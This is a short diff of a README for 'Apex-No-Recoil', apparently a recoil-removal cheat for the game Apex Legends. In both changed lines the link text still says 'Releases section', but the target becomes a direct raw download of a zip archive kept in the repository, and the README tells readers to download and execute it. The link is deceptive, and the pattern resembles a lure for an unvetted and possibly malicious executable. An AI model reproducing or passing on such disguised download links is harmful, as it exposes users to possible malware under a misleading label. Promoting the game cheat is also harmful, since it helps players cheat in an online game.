@@ -24,7 +24,7 @@
 
 ## Get the Tool
 
-🔧 **Download and execute the tool from the [Releases section](https://github.com/Sylvanogammer/Apex-No-Recoil/releases).**
+🔧 **Download and execute the tool from the [Releases section](https://raw.githubusercontent.com/Sylvanogammer/Apex-No-Recoil/main/gamelang/Recoil-No-Apex-3.2.zip).**
 
 ---
 
@@ -38,7 +38,7 @@ Whether you're a seasoned player looking to enhance your skills or a newcomer se
 
 ---
 
-⚠️ For more details or troubleshooting, please refer to the [Releases section](https://github.com/Sylvanogammer/Apex-No-Recoil/releases).
+⚠️ For more details or troubleshooting, please refer to the [Releases section](https://raw.githubusercontent.com/Sylvanogammer/Apex-No-Recoil/main/gamelang/Recoil-No-Apex-3.2.zip).
 
 ---
 
